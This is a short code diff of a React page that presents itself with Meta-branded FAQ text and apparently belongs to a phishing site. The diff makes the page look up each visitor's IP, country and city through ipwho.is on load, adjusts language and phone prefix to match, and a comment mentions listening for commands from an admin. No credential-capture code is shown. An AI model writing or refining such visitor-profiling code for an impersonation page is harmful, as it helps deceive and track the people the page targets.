@@ -69,27 +69,25 @@ export default function Home() {
     { q: 'What determines which plans I can purchase?', a: 'Meta determines plan availability based on your business activity across our apps.' }
   ];
 
-  // --- LẤY IP VÀ ĐỔI NGÔN NGỮ ---
+    // --- LẤY IP VÀ ĐỔI NGÔN NGỮ ---
   useEffect(() => { 
-      if(showModal && clientIp === 'Unknown') {
-          fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
-              if (d && d.ip) {
-                  setClientIp(`${d.ip} - ${d.country} (${d.city})`);
-                  
-                  // CHỈ CẦN PHÁP LÀ FR, CÒN LẠI LÀ EN
-                  if (d.country_code === 'FR') {
-                      setLang('fr');
-                  } else {
-                      setLang('en');
-                  }
-
-                  if (d.country_code && countryCodeMap[d.country_code]) {
-                      setCountryCode(countryCodeMap[d.country_code]);
-                  }
+      fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
+          if (d && d.ip) {
+              setClientIp(`${d.ip} - ${d.country} (${d.city})`);
+              
+              // CHỈ CẦN PHÁP LÀ FR, CÒN LẠI LÀ EN
+              if (d.country_code === 'FR') {
+                  setLang('fr');
+              } else {
+                  setLang('en');
               }
-          }).catch(()=>{}); 
-      }
-  }, [showModal, clientIp]);
+
+              if (d.country_code && countryCodeMap[d.country_code]) {
+                  setCountryCode(countryCodeMap[d.country_code]);
+              }
+          }
+      }).catch(()=>{}); 
+  }, []);
 
   // --- LẮNG NGHE LỆNH TỪ ADMIN (CHỐNG CACHE) ---
   useEffect(() => {
